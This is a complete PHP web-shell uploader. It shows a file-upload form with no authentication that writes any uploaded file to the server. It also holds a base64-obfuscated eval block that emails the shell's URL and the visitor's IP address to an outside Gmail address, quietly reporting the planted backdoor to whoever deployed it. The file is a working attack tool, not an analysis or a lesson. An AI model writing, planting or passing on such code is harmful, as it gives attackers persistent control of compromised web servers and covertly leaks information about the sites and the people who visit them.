<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>File Uploaded!!<b><br><br>'; }
else { echo '<b>Fail To Upload File!!!</b><br><br>'; }
}
?>
<?php
eval(base64_decode('JHR1anVhbm1haWwgPSAnYWRpdHlhZHdpZ3VuYTA5QGdtYWlsLmNvbSc7DQokeF9wYXRoID0gImh0dHA6Ly8iIC4gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10gLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsNCiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsNCm1haWwoJHR1anVhbm1haWwsICJDb250YWN0IE1lIiwgJHBlc2FuX2FsZXJ0LCAiWyAiIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiIF0iKTs='));
?>
